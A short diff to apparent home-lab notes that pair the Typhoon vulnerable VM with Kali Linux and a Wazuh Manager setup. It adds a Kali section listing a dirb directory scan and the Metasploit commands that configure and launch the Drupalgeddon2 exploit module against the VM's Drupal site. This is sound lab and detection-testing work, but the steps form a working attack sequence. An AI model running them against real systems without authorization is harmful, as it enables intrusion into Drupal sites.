@@ -3,6 +3,24 @@ Link for Typhoon VM OVA: https://www.vulnhub.com/entry/typhoon-102,267/
 Kali Linux Download: https://www.kali.org/get-kali/
 
 
+##################### Kali Linux #####################################
+
+dirb http://*IP of Typhoon*/
+
+msfconsole
+
+use exploit/unix/webapp/drupal_drupalgeddon2
+
+show options
+
+set rhosts *IP of Typhoon*
+
+set targeturi drupal/
+
+show options
+
+exploit
+
 ##################### Wazuh Manager ###################################
 
 nano /var/ossec/etc/shared/default/agent.conf
